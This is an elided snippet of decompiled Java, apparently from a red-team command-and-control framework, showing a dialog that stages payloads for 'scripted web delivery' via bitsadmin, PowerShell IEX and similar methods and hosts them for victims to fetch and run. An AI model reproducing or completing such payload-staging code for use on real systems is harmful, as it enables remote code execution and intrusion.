...
public class ScriptedWebStageDialog implements DialogListener, Callback {
   ...
   public void dialogAction(ActionEvent var1, Map var2) {
      ...
      byte[] var12 = var11.export(this.client, var10);
      if (var12.length == 0) {
         ...
         if ("bitsadmin".equals(var6)) {
            ...
            String var14 = var4.toLowerCase();
            if (!var14.endsWith(".exe") && !var14.endsWith(".scr")) {
               var4 = var4 + ".exe";
               var2.put("uri", var4);
            }

            this.client.getConnection().call("cloudstrike.host_data", CommonUtils.args(var5, Integer.parseInt(var3), var7, var4, CommonUtils.bString(var13), "application/octet-stream", "Scripted Web Delivery (exe)"), this);
         ...
         } else if ("powershell IEX".equals(var6)) {
            var13 = (new ResourceUtils(this.client)).buildPowerShell(var12, "x64".equals(var10));
            this.client.getConnection().call("cloudstrike.host_data", CommonUtils.args(var5, Integer.parseInt(var3), var7, var4, (new PowerShellUtils(this.client)).PowerShellCompress(var13), "text/plain", "Scripted Web Delivery (powershell IEX)"), this);
   ...
   public void show() {
      ...
      var1.combobox("type", "Type:", CommonUtils.toArray("bitsadmin, exe, powershell, powershell IEX, python"));
